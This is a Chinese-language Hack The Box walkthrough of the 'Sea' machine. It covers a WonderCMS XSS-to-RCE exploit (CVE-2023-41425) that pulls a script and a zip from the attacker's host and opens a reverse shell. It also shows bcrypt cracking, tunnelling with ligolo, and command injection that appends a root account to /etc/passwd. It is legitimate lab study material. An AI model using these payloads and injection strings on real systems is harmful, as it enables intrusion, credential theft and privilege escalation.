###### tags: `Hack the box` `HTB` `Easy` `Linux`

# Sea
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.32.49 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.32.49:22
Open 10.129.32.49:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZDkHH698ON6uxM3eFCVttoRXc1PMUSj8hDaiwlDlii0p8K8+6UOqhJno4Iti+VlIcHEc2THRsyhFdWAygICYaNoPsJ0nhkZsLkFyu/lmW7frIwINgdNXJOLnVSMWEdBWvVU7owy+9jpdm4AHAj6mu8vcPiuJ39YwBInzuCEhbNPncrgvXB1J4dEsQQAO4+KVH+QZ5ZCVm1pjXTjsFcStBtakBMykgReUX9GQJ9Y2D2XcqVyLPxrT98rYy+n5fV5OE7+J9aiUHccdZVngsGC1CXbbCT2jBRByxEMn+Hl+GI/r6Wi0IEbSY4mdesq8IHBmzw1T24A74SLrPYS9UDGSxEdB5rU6P3t91rOR3CvWQ1pdCZwkwC4S+kT35v32L8TH08Sw4Iiq806D6L2sUNORrhKBa5jQ7kGsjygTf0uahQ+g9GNTFkjLspjtTlZbJZCWsz2v0hG+fzDfKEpfC55/FhD5EDbwGKRfuL/YnZUPzywsheq1H7F0xTRTdr4w0At8=
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMMoxImb/cXq07mVspMdCWkVQUTq96f6rKz6j5qFBfFnBkdjc07QzVuwhYZ61PX1Dm/PsAKW0VJfw/mctYsMwjM=
|   256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHuXW9Vi0myIh6MhZ28W8FeJo0FRKNduQvcSzUAkWw7z
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sea - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

先把`sea.htb`加入`/etc/hosts`
```
┌──(kali㉿kali)-[~/htb]
└─$ sudo nano /etc/hosts

10.129.31.89    sea.htb
```

掃路徑
```
┌──(kali㉿kali)-[~/htb]
└─$ feroxbuster -u http://sea.htb -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt

Scans:
  0: running      http://sea.htb/
  1: running      http://sea.htb/themes/
  2: running      http://sea.htb/data/
  3: running      http://sea.htb/data/files/
  4: running      http://sea.htb/plugins/
  5: running      http://sea.htb/messages/
  6: running      http://sea.htb/themes/bike/
  7: running      http://sea.htb/themes/bike/css/
  
  
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -u http://sea.htb/themes/bike/FUZZ -w /home/kali/SecLists/Discovery/Web-Content/common.txt

.hta                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 314ms]
.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 3278ms]
404                     [Status: 200, Size: 3341, Words: 530, Lines: 85, Duration: 291ms]
Documents and Settings  [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 290ms]
LICENSE                 [Status: 200, Size: 1067, Words: 152, Lines: 22, Duration: 292ms]
.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 5303ms]
Program Files           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 289ms]
css                     [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 347ms]
home                    [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 323ms]
img                     [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 290ms]
reports list            [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 290ms]
summary                 [Status: 200, Size: 66, Words: 9, Lines: 2, Duration: 528ms]
version                 [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 289ms]
README.md               [Status: 200, Size: 318, Words: 40, Lines: 16, Duration: 292ms]
```

前往`http://sea.htb/themes/bike/LICENSE`可以google搜尋到[Turboblack](https://github.com/turboblack/Turboblack)，發現有`README.md`
```
MIT License

Copyright (c) 2019 turboblack
...
```

前往`http://sea.htb/themes/bike/README.md`可以看到
```
# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".
3. Find theme in the list and click "install".
4. In the "General" tab, select theme to activate it.
```

前往`http://sea.htb/themes/bike/version`
```
3.2.0
```

google搜尋[CVE-2023-41425](https://github.com/insomnia-jacob/CVE-2023-41425)然後記得把`main.zip`裡面的`rev.php`改成自己的port跟ip
```
┌──(kali㉿kali)-[~/htb/CVE-2023-41425]
└─$ python3 exploit.py -u http://sea.htb/loginURL -i 10.10.14.70 -p 4444 -r http://10.10.14.70:8000/main.zip
 
================================================================                                                                  
        # Autor      : Insomnia (Jacob S.)                                                                                        
        # IG         : insomnia.py                                                                                                
        # X          : @insomniadev_                                                                                              
        # Github     : https://github.com/insomnia-jacob                                                                          
================================================================                                                                  
 
[+]The zip file will be downloaded from the host:    http://10.10.14.70:8000/main.zip                                             
 
[+] File created:  xss.js                                                                                                         
 
[+] Set up nc to listen on your terminal for the reverse shell                                                                    
        Use:                                                                                                                      
                   nc -nvlp 4444                                                                                                  
 
[+] Send the below link to admin:                                                                                                 
                                                                                                                                  
         http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.70:8000/xss.js"></script><form+action="     

Starting HTTP server with Python3, waiting for the XSS request
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ..
```

開nc
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4444
```

前往`http://sea.htb/contact.php`

![Sea_1.png](picture/Sea_1.png)

之後把url加進去後按`submit`
```
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.70:8000/xss.js"></script><form+action=" 
```

等`http server`這邊有戳過來
```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.31.89 - - [04/Sep/2024 22:19:04] "GET /xss.js HTTP/1.1" 200 -
10.129.31.89 - - [04/Sep/2024 22:19:14] "GET /main.zip HTTP/1.1" 200 -
10.129.31.89 - - [04/Sep/2024 22:19:14] "GET /main.zip HTTP/1.1" 200 -
10.129.31.89 - - [04/Sep/2024 22:19:15] "GET /main.zip HTTP/1.1" 200 -
10.129.31.89 - - [04/Sep/2024 22:19:16] "GET /main.zip HTTP/1.1" 200 -
```

等反彈後可得到`www-data`的權限
```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@sea:/home/amay$ whoami
whoami
```

用linpeas
```
www-data@sea:/tmp$ wget 10.10.14.70/linpeas.sh
www-data@sea:/tmp$ chmod +x linpeas.sh
www-data@sea:/tmp$ ./linpeas.sh

╔══════════╣ Web files?(output limit)
/var/www/:
total 16K
drwxr-xr-x  4 root     root     4.0K Aug  1 12:28 .
drwxr-xr-x 14 root     root     4.0K Feb 21  2024 ..
drwxr-xr-x  2 root     root     4.0K Jul 17 18:58 html
drwxr-xr-x  6 www-data www-data 4.0K Feb 22  2024 sea

/var/www/html:
total 8.0K
drwxr-xr-x 2 root root 4.0K Jul 17 18:58 .

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                               
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                                                           
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:50391         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
```

到`/var/www/sea/data`可以看到`database.js`裡面有一個密碼
```json
www-data@sea:/var/www/sea/data$ cat database.js
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
```

用john破，可以破出密碼`mychemicalromance`
```
## sea
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q

┌──(kali㉿kali)-[~/htb]
└─$ john sea --wordlist=/home/kali/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mychemicalromance (?)
```

所以可以切成`amay`的權限在`/home/amay`可得user.txt
```
www-data@sea:/home$ su amay
Password: mychemicalromance

amay@sea:~$ cat user.txt
e8709773f2fe6efe8af0e6b86c71c190
```

之後利用`ligolo`可以連上`8080port`
```
┌──(kali㉿kali)-[~/ligolo-ng]
└─$ sudo ip tuntap add user kali mode tun ligolo

┌──(kali㉿kali)-[~/ligolo-ng]
└─$ sudo ip link set ligolo up

┌──(kali㉿kali)-[~/ligolo-ng]
└─$ ./proxy -selfcert

amay@sea:/tmp$ wget 10.10.14.70/agent
amay@sea:/tmp$ chmod +x agent
amay@sea:/tmp$ ./agent -connect 10.10.14.70:11601 -ignore-cert

ligolo-ng » session
? Specify a session : 1 - #1 - amay@sea - 10.129.31.89:49636
[Agent : amay@sea] » start
[Agent : amay@sea] » INFO[0085] Starting tunnel to amay@sea

┌──(kali㉿kali)-[~/htb]
└─$ sudo ip route add 240.0.0.1/32 dev ligolo
```

前往`http://240.0.0.1:8080/`之後用`amay`跟`mychemicalromance`登入，下面選`auth.log`用burp攔下來
```
POST / HTTP/1.1

Host: 240.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://240.0.0.1:8080
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: keep-alive
Referer: http://240.0.0.1:8080/
Cookie: JSESSIONID=node0atslgaluqpsy1ho1pw7ghui5x6.node0; csrf=jeHKf8TMmXjusr9
Upgrade-Insecure-Requests: 1


log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=
```

在`log_file`的欄位輸入`/etc/passwd`
```
log_file=/etc/passwd&analyze_log=

gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
_laurel:x:997:997::/var/log/laurel:/bin/false
```

發現可以得到，看能不能加入`toor`的帳號發現可以加入
```
log_file=/etc/passwd;echo+"toor%3aFdzt.eqJQ4s0g%3a0%3a0%3aroot%3a/root%3a/bin/bash"+>>+/etc/passwd&analyze_log=

log_file=/etc/passwd&analyze_log=

...
_laurel:x:997:997::/var/log/laurel:/bin/false
toor:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash
<p class='error'>Suspicious traffic patterns detected in /etc/passwd;id:</p><pre>toor:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash</pre>        
```

ssh登入amay的帳號後切成toor，在/root得root.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ ssh amay@10.129.31.89

amay@10.129.31.89's password: mychemicalromance

amay@sea:~$ su toor
Password: w00t

root@sea:~# cat root.txt
c1082c7c3c6f4e0fd66c2bcfc8d7ba98
```